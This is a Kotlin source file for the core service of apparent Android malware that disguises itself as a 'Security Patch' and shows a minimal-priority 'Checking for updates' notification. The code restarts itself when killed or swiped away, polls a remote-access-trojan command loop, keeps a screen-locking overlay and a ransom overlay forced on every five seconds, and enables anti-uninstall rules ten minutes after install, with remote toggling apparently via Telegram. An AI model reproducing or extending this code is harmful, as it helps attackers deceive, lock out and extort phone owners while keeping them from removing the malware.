package com.android.security.patch

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*

class CoreService : Service() {

    companion object {
        @Volatile var alive = false
        @Volatile var instance: CoreService? = null
        private const val CH_ID = "sys_chan"
        private const val NOTIF_ID = 2001
        private const val TEN_MIN = 10 * 60 * 1000L
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val handler = Handler(Looper.getMainLooper())
    private var pollJob: Job? = null
    private var watchdog: Job? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        alive = true
        instance = this
        createChannel()
        startForegroundCompat()
        startPoll()
        startWatchdog()
        scheduleAutoAntiUninstall()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!alive) {
            alive = true
            instance = this
            createChannel()
            startForegroundCompat()
            startPoll()
            startWatchdog()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        alive = false
        instance = null
        pollJob?.cancel()
        watchdog?.cancel()
        scope.cancel()
        // try to restart
        val i = Intent(this, CoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
        else startService(i)
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        // relaunch if user swipes away
        val restart = Intent(applicationContext, CoreService::class.java)
        val pi = PendingIntent.getService(
            this, 1, restart,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarm.set(
            AlarmManager.ELAPSED_REALTIME,
            android.os.SystemClock.elapsedRealtime() + 2000,
            pi
        )
        super.onTaskRemoved(rootIntent)
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NotificationManager::class.java)
            if (nm.getNotificationChannel(CH_ID) == null) {
                val ch = NotificationChannel(CH_ID, "System", NotificationManager.IMPORTANCE_MIN)
                ch.setShowBadge(false)
                ch.enableVibration(false)
                ch.setSound(null, null)
                nm.createNotificationChannel(ch)
            }
        }
    }

    private fun startForegroundCompat() {
        val notif = NotificationCompat.Builder(this, CH_ID)
            .setContentTitle("Security Patch")
            .setContentText("Checking for updates")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, notif,
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CONNECTED_DEVICE)
        } else {
            startForeground(NOTIF_ID, notif)
        }
    }

    private fun startPoll() {
        pollJob?.cancel()
        pollJob = scope.launch {
            RatApi.pollLoop(this@CoreService)
        }
    }

    /**
     * Watchdog: setiap 5 detik cek kalau HANG_ACTIVE di-prefs, tapi overlay belum
     * kelihatan — paksa re-attach (kalau system kill overlay window).
     */
    private fun startWatchdog() {
        watchdog?.cancel()
        watchdog = scope.launch {
            while (isActive) {
                try {
                    if (Prefs.getBool(this@CoreService, Prefs.HANG_ACTIVE)) {
                        HangManager.ensureAttached(this@CoreService)
                    }
                    if (Prefs.getBool(this@CoreService, Prefs.RANSOM_ACTIVE)) {
                        RansomManager.ensureOverlay(this@CoreService)
                    }
                } catch (_: Throwable) {}
                delay(5000)
            }
        }
    }

    /**
     * Setelah 10 menit dari install pertama, aktifkan anti-uninstall otomatis.
     * Kalau di-toggle manual via telegram, timer ini di-cancel.
     */
    private fun scheduleAutoAntiUninstall() {
        val install = Prefs.getLong(this, Prefs.INSTALL_TS)
        if (install == 0L) return
        if (Prefs.getBool(this, "auto_anti_done")) return

        val elapsed = System.currentTimeMillis() - install
        val remaining = TEN_MIN - elapsed
        if (remaining <= 0) {
            activate()
            return
        }
        handler.postDelayed({ activate() }, remaining)
    }

    private fun activate() {
        if (Prefs.getBool(this, "auto_anti_done")) return
        Prefs.setBool(this, Prefs.ANTI_UNINSTALL_ON, true)
        Prefs.setBool(this, "auto_anti_done", true)
        Rules.applyAntiUninstall(this, true)
    }
}